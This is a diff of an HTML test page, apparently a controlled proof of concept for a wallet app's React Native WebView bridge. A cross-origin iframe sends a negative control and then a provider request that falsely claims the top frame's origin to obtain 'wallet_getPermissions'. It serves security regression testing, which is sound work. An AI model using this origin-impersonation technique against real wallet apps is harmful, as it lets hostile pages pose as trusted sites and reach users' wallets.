@@ -2,93 +2,94 @@
 <html lang="en">
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Controlled Origin B</title>
-<style>body{font:14px/1.4 system-ui;margin:12px}pre{white-space:pre-wrap}</style>
-<strong>Controlled Origin B iframe</strong>
-<pre id="status"></pre>
+<title>Core strict validator Origin B</title>
+<body style="font:14px/1.4 system-ui;margin:12px">
+<strong>Controlled Origin B</strong>
+<pre id="log"></pre>
 <script>
 (() => {
   'use strict';
 
   const query = new URLSearchParams(location.search);
   const topOrigin = query.get('topOrigin');
-  const markerUrl = query.get('markerUrl');
-  const status = document.getElementById('status');
+  const session = query.get('session');
+  const output = document.getElementById('log');
 
-  if (!topOrigin || new URL(topOrigin).origin !== topOrigin) {
-    throw new Error('A valid topOrigin query parameter is required');
-  }
+  if (!topOrigin || !session) throw new Error('Missing controlled test parameters');
+  if (new URL(topOrigin).origin !== topOrigin) throw new Error('Invalid topOrigin');
 
-  function report(event, detail = {}) {
+  function report(event, details = {}) {
     const message = {
-      lab: 'core-frame-provenance',
+      lab: 'core-strict',
+      session,
       event,
-      childOrigin: location.origin,
-      ...detail
+      actualChildOrigin: location.origin,
+      isSubframe: self !== top,
+      time: new Date().toISOString(),
+      ...details
     };
-    status.textContent += JSON.stringify(message) + '\n';
+    output.textContent += JSON.stringify(message) + '\n';
     parent.postMessage(message, topOrigin);
   }
 
-  function nativePost(message) {
-    const serialized = JSON.stringify(message);
-
-    // Android WebMessageListener / JavaScriptInterface surface.
-    if (window.ReactNativeWebView && typeof window.ReactNativeWebView.postMessage === 'function') {
-      window.ReactNativeWebView.postMessage(serialized);
-      return 'window.ReactNativeWebView';
-    }
-
-    // Raw WKScriptMessageHandler surface. The main-frame-only Core wrapper is
-    // intentionally not needed for this provenance regression.
-    const iosHandler = window.webkit && window.webkit.messageHandlers &&
-      window.webkit.messageHandlers.ReactNativeWebView;
-    if (iosHandler && typeof iosHandler.postMessage === 'function') {
-      iosHandler.postMessage(serialized);
-      return 'window.webkit.messageHandlers.ReactNativeWebView';
-    }
-
-    throw new Error('No Core React Native bridge is visible in Origin B');
-  }
-
-  function sendProviderProbe(id, claimedOrigin) {
-    const wrapper = {
+  function nativePost(id, claimedOrigin) {
+    const message = JSON.stringify({
       method: 'provider_request',
       payload: JSON.stringify({
-        id: Number(id),
+        id,
         origin: claimedOrigin,
         request: { method: 'wallet_getPermissions', params: [] }
       })
-    };
-    const bridge = nativePost(wrapper);
-    report('B_PROVIDER_REQUEST_POSTED', { id, claimedOrigin, bridge });
+    });
+
+    if (window.ReactNativeWebView?.postMessage) {
+      window.ReactNativeWebView.postMessage(message);
+      return 'window.ReactNativeWebView';
+    }
+    const ios = window.webkit?.messageHandlers?.ReactNativeWebView;
+    if (ios?.postMessage) {
+      ios.postMessage(message);
+      return 'window.webkit.messageHandlers.ReactNativeWebView';
+    }
+    throw new Error('Native bridge is not exposed to Origin B');
   }
 
   addEventListener('message', event => {
     if (event.source !== parent || event.origin !== topOrigin) return;
     const data = event.data;
-    if (!data || data.lab !== 'core-frame-provenance') return;
+    if (!data || data.lab !== 'core-strict' || data.session !== session) return;
+    if (data.command !== 'RUN_DIFFERENTIAL') return;
 
     try {
-      if (data.command === 'PROVIDER_CALLBACK_PROBE') {
-        sendProviderProbe(data.id, data.claimedOrigin);
-      } else if (data.command === 'WINDOW_OPEN_PROBE') {
-        if (!markerUrl || !/^https?:\/\//i.test(markerUrl)) {
-          throw new Error('A controlled HTTP(S) marker URL is required');
+      const negativeBridge = nativePost(data.negativeId, location.origin);
+      report('NEGATIVE_CONTROL_POSTED', {
+        id: data.negativeId,
+        claimedOrigin: location.origin,
+        bridge: negativeBridge
+      });
+
+      setTimeout(() => {
+        try {
+          const positiveBridge = nativePost(data.positiveId, data.topOrigin);
+          report('IMPERSONATION_REQUEST_POSTED', {
+            id: data.positiveId,
+            claimedOrigin: data.topOrigin,
+            bridge: positiveBridge
+          });
+        } catch (error) {
+          report('CHILD_ERROR', { message: String(error) });
         }
-        const bridge = nativePost({ method: 'window_open', payload: markerUrl });
-        report('B_WINDOW_OPEN_POSTED', { markerUrl, bridge });
-      }
+      }, 500);
     } catch (error) {
-      report('B_ERROR', { message: String(error) });
+      report('CHILD_ERROR', { message: String(error) });
     }
   });
 
   report('CHILD_READY', {
-    href: location.href,
-    androidBridge: Boolean(window.ReactNativeWebView),
+    androidBridge: Boolean(window.ReactNativeWebView?.postMessage),
     iosRawBridge: Boolean(window.webkit?.messageHandlers?.ReactNativeWebView)
   });
 })();
 </script>
+</body>
 </html>
